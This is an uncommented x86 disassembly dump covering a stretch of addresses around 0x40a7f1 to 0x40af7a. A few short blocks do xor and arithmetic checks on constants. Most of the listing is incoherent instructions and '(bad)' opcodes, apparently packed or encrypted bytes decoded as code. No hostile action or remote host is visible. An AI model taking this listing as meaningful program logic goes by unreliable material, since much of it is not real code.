  40a7f1:	cmp    DWORD PTR ds:0x43049e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43049e
  40a803:	inc    eax
  40a804:	mov    ds:0x43049e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4304d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4304d6
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a857
  40a840:	scas   eax,DWORD PTR es:[edi]
  40a841:	mov    bh,0xec
  40a843:	adc    eax,0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a7e8
  40a84c:	aas    
  40a84d:	sub    DWORD PTR [edi+0x7143679],eax
  40a853:	imul   edx,eax,0xffffffc6
  40a856:	retf   
  40a857:	mov    ah,BYTE PTR [ebp-0x6343acba]
  40a85d:	loopne 0x40a8b9
  40a85f:	call   0x388d:0xb9f04a1
  40a866:	(bad)  
  40a867:	push   eax
  40a868:	or     eax,DWORD PTR [ebp-0x6aea4a16]
  40a86e:	push   edi
  40a86f:	cmc    
  40a870:	jnp    0x40a898
  40a872:	sbb    DWORD PTR [edi+eax*1+0x48e325ac],esi
  40a879:	push   0x26db2eab
  40a87e:	cwde   
  40a87f:	add    eax,0xf9d0db61
  40a884:	cs inc cx
  40a887:	sahf   
  40a888:	sahf   
  40a889:	and    dh,ch
  40a88b:	lock sti 
  40a88d:	pop    ss
  40a88e:	push   ebx
  40a88f:	mov    cl,0xc5
  40a891:	rol    bl,cl
  40a893:	call   DWORD PTR [ecx+ebp*2-0x1e16f8d3]
  40a89a:	push   ebx
  40a89b:	and    ecx,DWORD PTR [edx+ecx*2-0x7cd98368]
  40a8a2:	daa    
  40a8a3:	mov    ecx,esp
  40a8a5:	mov    bl,0x49
  40a8a7:	jl     0x40a911
  40a8a9:	jns    0x40a8d2
  40a8ab:	pop    ebx
  40a8ac:	add    al,0x2e
  40a8ae:	sub    eax,0xb80177f0
  40a8b3:	shl    eax,0x7b
  40a8b6:	(bad)  
  40a8b8:	(bad)  
  40a8b9:	pop    edx
  40a8ba:	mov    eax,0xf7c609db
  40a8bf:	fwait
  40a8c0:	xchg   ebx,eax
  40a8c1:	loop   0x40a8e4
  40a8c3:	sahf   
  40a8c4:	scas   al,BYTE PTR es:[edi]
  40a8c5:	sub    eax,0xd54faf
  40a8ca:	lods   eax,DWORD PTR ds:[esi]
  40a8cb:	sub    DWORD PTR [ebx+0x18],0xe
  40a8cf:	xchg   DWORD PTR [ecx],ecx
  40a8d1:	inc    edi
  40a8d2:	jg     0x40a8f8
  40a8d4:	pop    eax
  40a8d5:	adc    ch,BYTE PTR [ecx]
  40a8d7:	and    dh,BYTE PTR [esp+eiz*2+0x4446cc49]
  40a8de:	push   0x209775f4
  40a8e3:	and    eax,0xaef4ca0
  40a8e8:	retf   0x1fa3
  40a8eb:	mov    esp,0x204ad00
  40a8f0:	retf   
  40a8f1:	lahf   
  40a8f2:	and    BYTE PTR ds:0x764b0102,0xbc
  40a8f9:	xchg   edx,eax
  40a8fa:	loopne 0x40a883
  40a8fc:	imul   eax,DWORD PTR [edi-0x70],0xed500c5
  40a903:	int    0xc3
  40a905:	cli    
  40a906:	fucomi st,st(6)
  40a908:	push   edi
  40a909:	ss xchg ecx,eax
  40a90b:	cli    
  40a90c:	lahf   
  40a90d:	sahf   
  40a90e:	fidiv  DWORD PTR [ecx+0x72]
  40a911:	fiadd  DWORD PTR [ebx]
  40a913:	daa    
  40a914:	iret   
  40a915:	aaa    
  40a916:	fmul   DWORD PTR [ebx]
  40a918:	mov    ebp,0xf7a18238
  40a91d:	dec    esp
  40a91e:	adc    DWORD PTR [eax-0x509bd53],edi
  40a924:	mov    cl,0x88
  40a926:	lods   eax,DWORD PTR ds:[esi]
  40a927:	push   edi
  40a928:	ss imul esp,edx,0x3e5b9c24
  40a92f:	push   esp
  40a930:	or     DWORD PTR [ebx-0x45],eax
  40a933:	mov    WORD PTR [eax+0x1b0a8477],?
  40a939:	ins    DWORD PTR es:[edi],dx
  40a93a:	aad    0x21
  40a93c:	push   0x8841604a
  40a941:	fs int3 
  40a943:	cdq    
  40a944:	pushf  
  40a945:	in     eax,0x82
  40a947:	mov    es,WORD PTR [edx]
  40a949:	dec    esp
  40a94a:	je     0x40a948
  40a94c:	fisub  DWORD PTR [ebp+0x17726028]
  40a952:	dec    edi
  40a953:	jb     0x40a96e
  40a955:	and    DWORD PTR [eax+0x7b],ecx
  40a958:	inc    ebx
  40a959:	test   al,0x6c
  40a95b:	push   esi
  40a95c:	jp     0x40a90e
  40a95e:	popa   
  40a95f:	call   0x597ce67a
  40a964:	hlt    
  40a965:	jns    0x40a93d
  40a967:	add    eax,0xf18aa284
  40a96c:	push   0xffffffdd
  40a96e:	sub    al,0x76
  40a970:	cdq    
  40a971:	add    al,0xa0
  40a973:	xor    eax,0x64d50a06
  40a978:	sbb    esi,DWORD PTR [edi-0x66]
  40a97b:	fisttp WORD PTR [ecx-0x1db87c3c]
  40a981:	(bad)  
  40a982:	fucomp st(5)
  40a984:	mov    dh,0x30
  40a986:	rcl    DWORD PTR [eax],0x13
  40a989:	add    DWORD PTR [edi],0xb6b5ef37
  40a98f:	cmc    
  40a990:	cs dec eax
  40a992:	aad    0x5c
  40a994:	pop    edx
  40a995:	cmp    DWORD PTR [edi-0x76a9d5cc],edx
  40a99b:	xor    ebx,DWORD PTR [eax-0x15]
  40a99e:	sbb    al,0x8f
  40a9a0:	lahf   
  40a9a1:	mov    esi,0xde2b2981
  40a9a6:	addr16 cwde 
  40a9a8:	jnp    0x40a9e9
  40a9aa:	cmp    al,0x18
  40a9ac:	pop    ebp
  40a9ad:	sub    DWORD PTR [edx+0x7a38d146],0x1e
  40a9b4:	push   ebx
  40a9b5:	add    DWORD PTR [esi-0x31f48d42],ebx
  40a9bb:	sbb    BYTE PTR [esi-0x4b],ah
  40a9be:	pop    es
  40a9bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9c0:	lock call 0x323:0x99be5b1f
  40a9c8:	int    0x26
  40a9ca:	cmp    dh,BYTE PTR ds:0x70c91f81
  40a9d0:	div    BYTE PTR [esi]
  40a9d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d3:	repnz ficom DWORD PTR [eax-0x64802e5]
  40a9da:	cmp    eax,0x8ca308a4
  40a9df:	mov    dl,0x8e
  40a9e1:	scas   eax,DWORD PTR es:[edi]
  40a9e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9e3:	add    eax,0xebaa1953
  40a9e8:	sub    DWORD PTR [edx-0x53097a12],ebx
  40a9ee:	inc    esp
  40a9ef:	xchg   ebx,eax
  40a9f0:	mov    ds:0xe34e60f5,al
  40a9f5:	mov    esi,0xf2600b67
  40a9fa:	mov    dh,bh
  40a9fc:	cs aad 0x27
  40a9ff:	xchg   ebp,eax
  40aa00:	mov    ds:0xd419a14e,eax
  40aa05:	std    
  40aa06:	push   0xac1ac06b
  40aa0b:	js     0x40aa40
  40aa0d:	(bad)  
  40aa0f:	aad    0x63
  40aa11:	sbb    DWORD PTR [ebx],edi
  40aa13:	xchg   esp,eax
  40aa14:	sub    BYTE PTR [edx+0x3a],ah
  40aa17:	xor    bh,BYTE PTR ds:0xd5cdbdfd
  40aa1d:	ins    BYTE PTR es:[edi],dx
  40aa1e:	and    dh,al
  40aa20:	sub    ebp,0xffffff85
  40aa23:	xchg   ecx,eax
  40aa24:	(bad)  es:[esp+ebx*2]
  40aa28:	jle    0x40a9f1
  40aa2a:	inc    ebp
  40aa2b:	cld    
  40aa2c:	xor    al,BYTE PTR [ebp-0x2ef40764]
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e762,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43055a,0x42e762
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e75a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430556,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	jae    0x40ab09
  40aa9f:	push   ds
  40aaa0:	retf   
  40aaa1:	jae    0x40aa90
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aa81
  40aaaa:	mov    al,ds:0x308c8275
  40aaaf:	fst    DWORD PTR [esi+ecx*8]
  40aab2:	xor    ecx,DWORD PTR [ecx+0x30]
  40aab5:	xlat   BYTE PTR ds:[ebx]
  40aab6:	call   0x5188d229
  40aabb:	outs   dx,BYTE PTR ds:[esi]
  40aabc:	ins    DWORD PTR es:[edi],dx
  40aabd:	pop    esp
  40aabe:	xor    DWORD PTR [eax-0x7e],esi
  40aac1:	js     0x40aaa1
  40aac3:	in     eax,dx
  40aac4:	mov    ah,0x87
  40aac6:	(bad)
  40aac9:	jno    0x40aab4
  40aacb:	(bad)
  40aace:	sbb    al,0xc8
  40aad0:	xor    eax,0x1f5e7f5b
  40aad5:	das    
  40aad6:	add    al,0x58
  40aad8:	pop    edx
  40aada:	pop    ss
  40aadb:	xchg   BYTE PTR [ebx],ch
  40aadd:	xor    bl,BYTE PTR [ebx]
  40aadf:	sti    
  40aae0:	cmp    eax,0x99841300
  40aae5:	js     0x40aaf3
  40aae7:	xchg   DWORD PTR [eax-0x33],ecx
  40aaea:	out    dx,al
  40aaeb:	outs   dx,DWORD PTR ds:[esi]
  40aaec:	mov    eax,edx
  40aaee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaef:	sbb    dl,al
  40aaf1:	sbb    DWORD PTR [edx+edx*4+0x2a],ebp
  40aaf5:	lahf   
  40aaf6:	(bad)  
  40aaf8:	das    
  40aaf9:	pusha  
  40aafa:	mov    esi,0xa801aaa6
  40aaff:	retf   
  40ab00:	mov    ah,0xae
  40ab02:	dec    ebp
  40ab03:	dec    ebx
  40ab04:	and    edx,DWORD PTR [edi+ebp*4+0x73de31e9]
  40ab0b:	in     eax,0xcf
  40ab0d:	fsubr  QWORD PTR [edi+ebx*1]
  40ab10:	push   0x401d4717
  40ab15:	adc    eax,0x77912d1f
  40ab1a:	pop    ecx
  40ab1b:	ret    
  40ab1c:	ret    
  40ab1d:	jp     0x40ab95
  40ab1f:	add    bl,ch
  40ab21:	fidivr WORD PTR [eax]
  40ab23:	std    
  40ab24:	mov    eax,0x83a43a25
  40ab29:	and    ch,bl
  40ab2b:	mov    esi,0x902504db
  40ab30:	inc    esi
  40ab31:	sti    
  40ab32:	dec    eax
  40ab33:	les    edi,FWORD PTR [ebx+0x112260f0]
  40ab39:	fisubr DWORD PTR [edi-0x79]
  40ab3c:	rol    BYTE PTR [esi+0x50],cl
  40ab3f:	(bad)  
  40ab40:	bound  esp,QWORD PTR [ebx-0x69]
  40ab43:	(bad)  [ecx]
  40ab45:	stos   BYTE PTR es:[edi],al
  40ab46:	mov    ds:0xe670ff45,al
  40ab4b:	xchg   edx,eax
  40ab4c:	daa    
  40ab4d:	stos   DWORD PTR es:[edi],eax
  40ab4e:	mov    bh,0x15
  40ab50:	add    DWORD PTR [edi],0xffffffd9
  40ab53:	sbb    DWORD PTR [ecx+0x71f04b2b],edi
  40ab59:	sub    DWORD PTR [eax],eax
  40ab5b:	sub    esp,edi
  40ab5d:	and    bl,BYTE PTR [ecx]
  40ab5f:	inc    ecx
  40ab60:	dec    ecx
  40ab61:	add    DWORD PTR gs:[ebp+0x1126450],esi
  40ab68:	fldenv [ebx+0x1fd16310]
  40ab6e:	fldcw  WORD PTR [edx+eax*8]
  40ab71:	stos   BYTE PTR es:[edi],al
  40ab72:	mov    ecx,0xe6ac3273
  40ab77:	mov    eax,0xd41c7f76
  40ab7c:	cwde   
  40ab7d:	(bad)  
  40ab7e:	mov    DWORD PTR [edi],ebx
  40ab80:	(bad)  
  40ab81:	push   edi
  40ab82:	idiv   BYTE PTR [ecx+0x2b]
  40ab85:	ins    BYTE PTR es:[edi],dx
  40ab86:	call   FWORD PTR [eax-0x12]
  40ab89:	ret    0x8cf0
  40ab8c:	mov    ds:0xfeee0f86,al
  40ab91:	in     al,dx
  40ab92:	cdq    
  40ab93:	nop
  40ab94:	push   ebx
  40ab95:	or     eax,0x427cfdee
  40ab9a:	in     al,dx
  40ab9b:	leave  
  40ab9c:	lahf   
  40ab9d:	mov    ecx,0x43e17504
  40aba2:	xchg   edx,eax
  40aba3:	in     eax,dx
  40aba4:	or     ebp,DWORD PTR [eax+ecx*8]
  40aba7:	xchg   ebp,eax
  40aba8:	imul   ecx
  40abaa:	(bad)  
  40abab:	int    0x6e
  40abad:	push   0xffffff85
  40abaf:	rol    BYTE PTR [edx],0x1b
  40abb2:	fdivr  DWORD PTR [esi+0x5f38a964]
  40abb8:	jle    0x40ac16
  40abba:	ins    BYTE PTR es:[edi],dx
  40abbb:	fistp  DWORD PTR [edi]
  40abbd:	out    0x1f,eax
  40abbf:	pusha  
  40abc0:	pop    esp
  40abc1:	sbb    DWORD PTR [edi+0x6135741e],eax
  40abc7:	xchg   esp,eax
  40abc8:	dec    esp
  40abc9:	jmp    0xc8db:0x6d7889d8
  40abd0:	clc    
  40abd1:	xchg   ecx,eax
  40abd2:	(bad)  
  40abd3:	mov    ds:0x4324bb77,al
  40abd8:	xor    DWORD PTR [edx],edi
  40abda:	mov    esp,DWORD PTR [ecx]
  40abdc:	les    esp,FWORD PTR [eax]
  40abde:	jle    0x40ab78
  40abe0:	cwde   
  40abe1:	ror    bl,1
  40abe3:	jne    0x40ac41
  40abe5:	pop    edx
  40abe6:	dec    esp
  40abe7:	jmp    0x40ac51
  40abe9:	inc    eax
  40abea:	icebp  
  40abeb:	push   edx
  40abec:	dec    ebx
  40abed:	aam    0x5b
  40abef:	xchg   edi,eax
  40abf0:	mov    eax,ds:0x4cc20468
  40abf5:	and    DWORD PTR [ecx+ebp*8+0x5d],esi
  40abf9:	addr16 inc esi
  40abfb:	(bad)  
  40abfc:	test   al,0xa3
  40abfe:	xor    BYTE PTR [ecx-0x638280a9],ah
  40ac04:	push   eax
  40ac05:	out    0x36,eax
  40ac07:	daa    
  40ac08:	pop    esi
  40ac09:	ret    
  40ac0a:	arpl   WORD PTR [eax+edi*1+0x49],si
  40ac0e:	mov    ds:0xf112e6ac,eax
  40ac13:	jns    0x40abf7
  40ac15:	js     0x40ac52
  40ac17:	enter  0x31e2,0xd2
  40ac1b:	mov    al,0xcf
  40ac1d:	dec    esi
  40ac1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac1f:	gs push ds
  40ac21:	jo     0x40abd6
  40ac23:	imul   ebp,DWORD PTR [edx-0x3d],0xffffffe5
  40ac27:	sub    edi,ecx
  40ac29:	and    ah,ah
  40ac2b:	dec    ebx
  40ac2c:	xor    ah,BYTE PTR [edx]
  40ac2e:	and    ah,BYTE PTR [edi-0x34bf91e2]
  40ac34:	ss clc 
  40ac36:	daa    
  40ac37:	rcl    BYTE PTR [ecx],cl
  40ac39:	jl     0x40ac56
  40ac3b:	xchg   esp,eax
  40ac3c:	mov    BYTE PTR [ebx+edx*8+0x4a],bl
  40ac40:	jo     0x40ac44
  40ac42:	add    eax,0x30fad792
  40ac47:	das    
  40ac48:	xor    cl,al
  40ac4a:	fsub   DWORD PTR [edi-0x4dc90321]
  40ac50:	and    eax,0xcad45557
  40ac55:	cmp    al,0xd9
  40ac57:	pop    ss
  40ac58:	rcl    DWORD PTR [edi+0x35c57779],0xcb
  40ac5f:	dec    esi
  40ac60:	test   al,0xf3
  40ac62:	sub    dh,al
  40ac64:	in     al,dx
  40ac65:	and    BYTE PTR [edx+ebx*1],ah
  40ac68:	(bad)  
  40ac6a:	cwde   
  40ac6b:	xor    DWORD PTR [edx],ebx
  40ac6d:	or     ch,BYTE PTR [edx+edx*4-0xa726fcc]
  40ac74:	or     ebp,DWORD PTR [ecx]
  40ac76:	jmp    0xfe78:0x38dd91c3
  40ac7d:	aad    0x6
  40ac7f:	cmp    eax,edx
  40ac81:	and    edi,edi
  40ac83:	loopne 0x40ac05
  40ac85:	mov    al,0xca
  40ac87:	xor    eax,edx
  40ac89:	xor    esi,edx
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0xdcf24d02
  40aca1:	ret    
  40aca2:	push   ecx
  40aca3:	out    dx,al
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ac40
  40acab:	test   al,dl
  40acad:	arpl   ax,si
  40acaf:	call   DWORD PTR [ecx+eax*1+0x22]
  40acb3:	cmc    
  40acb4:	stos   BYTE PTR es:[edi],al
  40acb5:	icebp  
  40acb6:	jecxz  0x40ac81
  40acb8:	pop    ebx
  40acb9:	icebp  
  40acba:	mov    dh,BYTE PTR [ecx]
  40acbc:	stos   BYTE PTR es:[edi],al
  40acbd:	adc    eax,DWORD PTR [eax-0x26]
  40acc0:	pop    ebp
  40acc1:	loope  0x40ad41
  40acc3:	jae    0x40acf3
  40acc5:	pop    edi
  40acc6:	xchg   DWORD PTR [eax-0x11ef25f8],eax
  40accc:	xor    ebp,DWORD PTR [eax]
  40acce:	imul   ebp,DWORD PTR [ebx+esi*2],0xe393f0ad
  40acd5:	shr    BYTE PTR [eax-0x38],1
  40acd8:	sbb    bh,ah
  40acda:	das    
  40acdb:	repnz dec esi
  40acdd:	js     0x40ad2f
  40acdf:	loope  0x40acd4
  40ace1:	mov    cl,0x1
  40ace3:	sub    BYTE PTR [eax+0x5e],bh
  40ace6:	xchg   BYTE PTR [edx-0x11],ah
  40ace9:	or     DWORD PTR [edx+0x621c15f5],ecx
  40acef:	sbb    eax,0x540c818f
  40acf4:	into   
  40acf5:	sub    cl,BYTE PTR [edx+ecx*2-0x1b]
  40acf9:	mov    edi,0x14e62edd
  40acfe:	dec    ebp
  40acff:	ret    0xf394
  40ad02:	mov    ebp,0x1f9245f1
  40ad07:	nop
  40ad08:	fdivr  st(3),st
  40ad0a:	ret    0x3fc7
  40ad0d:	pop    es
  40ad0e:	into   
  40ad0f:	jp     0x40acc7
  40ad11:	ss mov bl,0x50
  40ad14:	ss fdivr st(4),st
  40ad17:	jns    0x40ad51
  40ad19:	jle    0x40aca7
  40ad1b:	xchg   DWORD PTR [edi],esi
  40ad1d:	mov    DWORD PTR [ebx-0x12],esi
  40ad20:	xchg   esi,eax
  40ad21:	stc    
  40ad22:	int    0xdb
  40ad24:	cmp    ebx,DWORD PTR [esi-0x45]
  40ad27:	dec    eax
  40ad28:	js     0x40ad43
  40ad2a:	cli    
  40ad2b:	dec    ecx
  40ad2c:	xor    ecx,ebx
  40ad2e:	sbb    edx,ebp
  40ad30:	inc    ebx
  40ad31:	sub    edx,esi
  40ad33:	jno    0x40ad75
  40ad35:	in     al,dx
  40ad36:	lods   al,BYTE PTR ds:[esi]
  40ad37:	pop    esi
  40ad38:	pop    esi
  40ad39:	push   eax
  40ad3a:	dec    esp
  40ad3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad3c:	pop    ecx
  40ad3d:	push   DWORD PTR [edx-0xc354580]
  40ad43:	mov    eax,0x18ad9302
  40ad48:	xchg   ebx,eax
  40ad49:	test   BYTE PTR [ebx],0xa5
  40ad4c:	xor    cl,BYTE PTR [eax-0x381d7d1b]
  40ad52:	push   ebp
  40ad53:	jnp    0x40ad6f
  40ad55:	sub    BYTE PTR [esi+0x1b6c6625],dl
  40ad5b:	loopne 0x40ad1c
  40ad5d:	scas   al,BYTE PTR es:[edi]
  40ad5e:	retf   
  40ad5f:	(bad)  
  40ad60:	mov    eax,0x7a66cb69
  40ad65:	cmp    DWORD PTR [edx],edi
  40ad67:	adc    edx,DWORD PTR [esi+0x5aaf1c0e]
  40ad6d:	inc    esp
  40ad6e:	add    BYTE PTR [edx-0x2b],ah
  40ad71:	jle    0x40ad98
  40ad73:	dec    ebp
  40ad74:	jg     0x40addb
  40ad76:	or     eax,0xc68663c7
  40ad7b:	xchg   BYTE PTR [ecx-0x1b],al
  40ad7e:	fsubrp st(7),st
  40ad80:	dec    ecx
  40ad81:	data16 movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40ad84:	jb     0x40ad98
  40ad86:	sbb    dh,BYTE PTR [ecx-0x43ee93e0]
  40ad8c:	rcr    BYTE PTR [ebp-0x9],cl
  40ad8f:	pop    eax
  40ad90:	out    dx,eax
  40ad91:	push   ecx
  40ad92:	adc    BYTE PTR [esi+0x7903a467],ch
  40ad98:	pop    ebp
  40ad99:	call   0x479ce5d1
  40ad9e:	dec    esi
  40ad9f:	loop   0x40ad3c
  40ada1:	jae    0x40ae06
  40ada3:	jecxz  0x40ad5c
  40ada5:	aam    0x5d
  40ada7:	sub    DWORD PTR [ecx+0x2],ecx
  40adaa:	pop    ds
  40adab:	inc    edx
  40adac:	sub    ebp,0xffffff8a
  40adaf:	imul   ecx,DWORD PTR [ebx+ebp*4+0x1e04459f],0xd302d1cf
  40adba:	call   0x31d193c7
  40adbf:	inc    edi
  40adc0:	cld    
  40adc1:	mov    al,0xf9
  40adc3:	clc    
  40adc4:	in     eax,0xfb
  40adc6:	loop   0x40ada8
  40adc8:	rol    DWORD PTR [esi+0x67],cl
  40adcb:	ret    0xc7bd
  40adce:	dec    ebx
  40adcf:	jmp    0x8a657157
  40add4:	enter  0xd1d8,0x34
  40add8:	aad    0x5d
  40adda:	(bad)  
  40addb:	shl    DWORD PTR [ebp+0x25],cl
  40adde:	inc    eax
  40addf:	popf   
  40ade0:	mov    eax,ds:0xb00f6c3
  40ade5:	dec    esp
  40ade6:	cmp    BYTE PTR [ecx+0x66],dl
  40ade9:	fild   WORD PTR [ebx-0x3320e535]
  40adef:	mov    BYTE PTR [edx-0x24],dl
  40adf2:	pop    esi
  40adf3:	cmp    edi,DWORD PTR [ebp+0x2b]
  40adf6:	or     DWORD PTR ds:0x54ea41ea,eax
  40adfc:	lahf   
  40adfd:	mov    ds:0xa7383437,al
  40ae02:	lahf   
  40ae03:	repz and al,0x23
  40ae06:	aaa    
  40ae07:	cwde   
  40ae08:	loope  0x40ade9
  40ae0a:	outs   dx,DWORD PTR ds:[esi]
  40ae0b:	(bad)  [ecx+ebp*4]
  40ae0e:	(bad)  
  40ae0f:	mov    ch,0xcc
  40ae11:	jb     0x40adce
  40ae13:	std    
  40ae14:	cmp    DWORD PTR [esp+eiz*8-0x20fc4f29],esi
  40ae1b:	pop    edx
  40ae1c:	mov    al,ds:0x2936b9ba
  40ae21:	imul   edi,edi,0xbaf77d04
  40ae27:	adc    al,cl
  40ae29:	or     al,0xd7
  40ae2b:	fsubr  QWORD PTR [edx+0x33]
  40ae2e:	popf   
  40ae2f:	or     ecx,edi
  40ae31:	pop    ecx
  40ae32:	mov    bh,0x58
  40ae34:	(bad)  
  40ae35:	(bad)  
  40ae36:	shl    BYTE PTR [eax-0x3ff581cf],1
  40ae3c:	jb     0x40ae71
  40ae3e:	das    
  40ae3f:	stos   BYTE PTR es:[edi],al
  40ae40:	adc    dl,dh
  40ae42:	lock xchg BYTE PTR [ebx+0x41],ah
  40ae46:	xchg   ecx,eax
  40ae47:	data16 cli 
  40ae49:	mov    esp,ebp
  40ae4b:	cdq    
  40ae4c:	leave  
  40ae4d:	addr16 aaa 
  40ae4f:	adc    ebx,ecx
  40ae51:	js     0x40ae41
  40ae53:	pop    ebp
  40ae54:	jecxz  0x40aec5
  40ae56:	dec    ebx
  40ae57:	repnz fsubr DWORD PTR [esi-0x48]
  40ae5b:	add    ch,BYTE PTR [edx+0x47]
  40ae5e:	xchg   ecx,eax
  40ae5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae60:	ins    BYTE PTR es:[edi],dx
  40ae61:	mov    edx,DWORD PTR fs:[ebx+esi*4-0x68bdaffa]
  40ae69:	mov    DWORD PTR [edx],eax
  40ae6b:	sub    edx,DWORD PTR [ecx]
  40ae6d:	les    ecx,FWORD PTR [ecx+0x7e]
  40ae70:	push   ebx
  40ae71:	pop    es
  40ae72:	and    al,BYTE PTR [edi+0x7407b1e4]
  40ae78:	frstor [esi]
  40ae7a:	(bad)
  40ae7d:	hlt    
  40ae7e:	adc    al,BYTE PTR [edx]
  40ae80:	adc    esi,ebx
  40ae82:	jp     0x40ae68
  40ae84:	adc    al,0x66
  40ae86:	push   ecx
  40ae87:	sbb    DWORD PTR [ebx],eax
  40ae89:	icebp  
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock iret 
  40aeb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aeb4:	aad    0x6b
  40aeb6:	mov    edi,0x5c7e7ee0
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40aeef
  40aebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec0:	into   
  40aec1:	(bad)  
  40aec2:	sti    
  40aec3:	call   0x1bfc:0x1bd32017
  40aeca:	pop    ebp
  40aecb:	rcr    BYTE PTR [ecx],0xd9
  40aece:	push   ebx
  40aecf:	ror    ebp,0x65
  40aed2:	call   0x31c31c46
  40aed7:	(bad)  
  40aed8:	and    BYTE PTR [ebp-0x55],ch
  40aedb:	push   esi
  40aedc:	shl    DWORD PTR [ecx+edx*4-0x73],cl
  40aee0:	out    0x85,eax
  40aee2:	sub    ecx,0xffffff88
  40aee5:	sar    DWORD PTR [edx-0x4c],1
  40aee8:	data16 and dl,BYTE PTR [ecx]
  40aeeb:	mov    ds:0xb87ca852,eax
  40aef0:	sub    BYTE PTR [eax-0x4b],bl
  40aef3:	or     ah,dl
  40aef5:	or     al,0x51
  40aef7:	add    al,0x21
  40aef9:	js     0x40af3b
  40aefb:	jb     0x40af3c
  40aefd:	mov    eax,ds:0xc437fdcf
  40af02:	push   es
  40af03:	push   ecx
  40af04:	mov    DWORD PTR [edx+ebp*8],eax
  40af07:	and    DWORD PTR [ecx],esp
  40af09:	mov    ds,WORD PTR [ebp+0x3]
  40af0c:	pusha  
  40af0d:	fwait
  40af0e:	inc    edx
  40af0f:	adc    ebx,DWORD PTR [esi]
  40af11:	push   ebx
  40af12:	sbb    esi,ebx
  40af14:	and    al,0x8c
  40af16:	int3   
  40af17:	add    edi,DWORD PTR [ecx-0x5f]
  40af1a:	sbb    eax,0x8d2fc5ba
  40af1f:	iret   
  40af20:	jnp    0x40aed9
  40af22:	sbb    al,0x81
  40af24:	cmp    ebx,DWORD PTR [esp+ecx*2]
  40af27:	mov    bh,0xa1
  40af2a:	or     eax,0xcc1bc94c
  40af2f:	lds    ebx,FWORD PTR [esp+ecx*4]
  40af32:	jne    0x40af83
  40af34:	stc    
  40af35:	pop    es
  40af36:	js     0x40aee6
  40af38:	das    
  40af39:	test   eax,0xc5d4b3ab
  40af3e:	addr16 imul ebx,edx,0x48d6d7bb
  40af45:	test   al,0x20
  40af47:	mov    bh,0xf7
  40af49:	rol    BYTE PTR [ecx-0x345656db],0x7a
  40af50:	mov    WORD PTR [edi+0x6d],?
  40af53:	and    dl,cl
  40af55:	repnz into 
  40af57:	clc    
  40af58:	mov    cl,0x4b
  40af5a:	cwde   
  40af5b:	jg     0x40af87
  40af5d:	mov    ecx,0xf8923b0
  40af62:	mov    DWORD PTR [ebx+ebx*4],esi
  40af65:	(bad)  
  40af66:	dec    edi
  40af67:	mov    bh,0x48
  40af69:	popf   
  40af6a:	xor    WORD PTR ds:0xe067df40,bp
  40af71:	dec    ecx
  40af72:	add    BYTE PTR [ebx],dh
  40af74:	mov    ds:0x945a1a31,al
  40af79:	cld    
  40af7a:	sub    DWORD PTR ds:0x682bfc3b,esp
